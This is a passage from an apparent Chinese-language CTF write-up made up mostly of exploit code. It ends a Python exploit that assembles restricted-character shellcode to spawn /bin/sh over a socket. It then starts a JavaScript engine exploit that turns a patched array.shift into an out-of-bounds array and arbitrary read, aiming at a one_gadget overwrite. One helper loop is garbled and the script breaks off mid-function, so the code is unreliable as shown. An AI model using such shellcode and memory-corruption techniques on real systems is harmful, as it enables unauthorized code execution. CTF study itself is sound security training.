    # pop rdi    # 0x5f
    buf += asm('''
     add cl, byte PTR [rdx] 
     add al, 6
     add byte PTR [rdx+rcx*1], al
     add al, 1
     add byte PTR [rdx+rcx*1], al
     ''')
    # al = 0x30
    # add rdi, 0x30f  # 4881c70f030000
    buf += asm('''
     add cl, byte PTR [rdx]
     add al, 0xf
     add al, 1
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add cl, byte PTR [rdx]
     add cl, byte PTR [rdx]
     add cl, byte PTR [rdx]
     ''')
    # al = 0x40
    # xor esi, esi  # 0x31f6
    buf += asm('''
     add cl, byte PTR [rdx]
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     ''')
    # al = 0x30
    # xor edx, edx  # 0x31d2
    buf += asm('''
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add al, 1
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     ''')
    # al = 0x31
    # push 0x3b  # 0x6a3b
    buf += asm('''
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     ''')
    # al = 0x31
    # pop rax  # 0x58
    buf += asm('''
     add cl, byte PTR [rdx]
     add al, 0xf
     add al, 0xf
     add al, 0x9
     add byte PTR [rdx+rcx*1], al
     ''')
    # al = 0x58
    # make /bin/sh
    # rcx = 0x200
    buf += asm('''
     add ecx, DWORD PTR [rip+0x20f]
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0xf
     add al, 0x5
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add al, 2
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add cl, byte PTR [rdx]
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     add byte PTR [rdx+rcx*1], al
     ''')
    # padding
    buf += asm('''
     add cl,  BYTE PTR [rdx]
     ''')*((0x200-len(buf))//2 - 1)
    buf += asm('''
     add cl, byte PTR [rdx+rax*1]
     ''')
    buf += b"\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"
    buf += b"\x00"*(0x2df-len(buf))
    buf += b"\x00\x01"  # rcx = 0x30f
    buf += b"\x00"*(0x30f-len(buf))
    buf += b"\x0f\x02\x09\x0e\x0f\x0d\x02"  # /bin/sh
    buf += b"\x00"*(0x30f+0x2f-len(buf))
    buf += b"\x00\x02"  # rcx = 0x200
    buf += b"\x00"*(1000-len(buf))
    s.sendline(flag+buf)
    s.interactive()
### Hello_Jerry
本题将 array.shift 进行了 patch ，每一次 shift 会将 length 减 2 ，那么当 length 为 1 的时候进行一次
shift 便可以得到一个 oob array ，之后便是常规的思路： `leak elf_base -> leak libc_base -> leak
stack_base -> write ret_addr to one_gadget` 编辑exp.js
    function printhex(s,u){
        print(s,"0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0'));
    }
    function hex(i){
        return "0x" + i.toString(16).padStart(16, '0');
    }
    function pack64(u){
        return u[0] + u[1] * 0x100000000;
    }
    function l32(data){
        let result = 0;
        for(let i=0;i>= 8;
        }
        return result;
    }
    a = [1.1];
    a.shift();
    var ab = new ArrayBuffer(0x1337);
    var dv = new DataView(ab);
    var ab2 = new ArrayBuffer(0x2338);
    var dv2 = new DataView(ab2);
    for(let i = 0; i < 0x90; i++){
        dv2 = new DataView(ab2);
    }
    a[0x193] = 0xffff;
    print("[+]change ab range");
    a[0x32] = 0xdead;
    for(let i = 0; i < 100000000; i ++){
    }
    var idx = 0;
    for (let i = 0; i < 0x5000; i++){
        let v = dv.getUint32(i, 1);
        if(v == 0x2338){
            idx = i;
        }
    }
    print("Get idx!");
    function arb_read(addr){
        dv.setUint32(idx + 4, l32(addr[0]));
        dv.setUint32(idx + 8, l32(addr[1]));
        let result = new Uint32Array(2);
        result[0] = dv2.getUint32(0, 1)
        result[1] = dv2.getUint32(4, 1);
        return result;